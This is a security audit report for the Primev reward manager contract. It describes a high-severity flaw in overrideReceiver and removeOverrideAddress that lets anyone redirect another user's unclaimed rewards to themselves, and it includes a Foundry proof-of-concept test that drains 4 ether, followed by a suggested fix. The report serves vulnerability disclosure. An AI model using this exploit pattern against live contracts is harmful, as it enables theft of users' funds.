# Primev — Bug Reports
https://cantina.xyz/code/e92be0b9-b4f2-4bf2-9544-ae285fcfc02d/overview
---

## [H-1] Exploitation of overrideReceiver and removeOverrideAddress Functions to Steal Rewards

Summary
An attacker can exploit the overrideReceiver and removeOverrideAddress functions to steal rewards by setting themselves as the receiver, overriding themselves with a legitimate override address, and then transferring all unclaimed rewards from the override address back to themselves. This exploit allows the attacker to bypass the intended reward distribution mechanism and steal rewards from the legitimate override address.

Finding Description
The overrideReceiver function sets the migrateExistingRewards as the overrideAddress of the caller.

function overrideReceiver(address overrideAddress, bool migrateExistingRewards) external whenNotPaused nonReentrant {
        if (migrateExistingRewards) { _migrateRewards(msg.sender, overrideAddress); }
        require(overrideAddress != address(0) && overrideAddress != msg.sender, InvalidAddress());
@>      overrideAddresses[msg.sender] = overrideAddress;
        emit OverrideAddressSet(msg.sender, overrideAddress);
    }
And the removeOverride function removes the override address of the msg.sender after migrating the overrideAddress's unclaimed rewards from overrideAddress to the msg.sender.

function removeOverrideAddress(bool migrateExistingRewards) external whenNotPaused nonReentrant {
        address toBeRemoved = overrideAddresses[msg.sender];
        require(toBeRemoved != address(0), NoOverriddenAddressToRemove());
@>      if (migrateExistingRewards) { _migrateRewards(toBeRemoved, msg.sender); }
        overrideAddresses[msg.sender] = address(0);
        emit OverrideAddressRemoved(msg.sender);
    }
An attacker can easily set a valid overrideReceiver as their overrideReceiver and later when there is unclaimed rewards, the attacker can migrate the overrideReceiver's unclaimedRewards to themselves

Impact Explanation
An attacker can steal all unclaimed rewards from a legitimate override address by exploiting this vulnerability.

Likelihood Explanation
Likelihood of the attack is high.

Proof of Concept
Paste and run this test in RewardManagerTest.sol.

function test_attacker_can_steal_rewards() public {
        vanillaRegistryTest.testSelfStake();

        address attacker = makeAddr("attacker");

        address vanillaTestUser = vanillaRegistryTest.user1();
        bytes memory vanillaTestUserPubkey = vanillaRegistryTest.user1BLSKey();

        address overrideAddr = vm.addr(0x999999977777777);
        vm.prank(vanillaTestUser);
        rewardManager.overrideReceiver(overrideAddr, false); // Set an override address.

        vm.prank(attacker);
        rewardManager.overrideReceiver(overrideAddr, false); // Attacker sets the same override address.

        vm.deal(user2, 4 ether);
        vm.prank(user2);
        rewardManager.payProposer{value: 4 ether}(vanillaTestUserPubkey);

        uint256 balanceBefore = attacker.balance;
        vm.prank(attacker);
        rewardManager.removeOverrideAddress(true);

        vm.prank(attacker);
        rewardManager.claimRewards(); // Attacker claims rewards.
        uint256 balanceAfter = attacker.balance;

        assertEq(balanceAfter, balanceBefore + 4 ether, "Attacker should be able to steal rewards");
    }
Recommendation
Add validation in the overrideReceiver function to make sure that it can be only called by the validator only.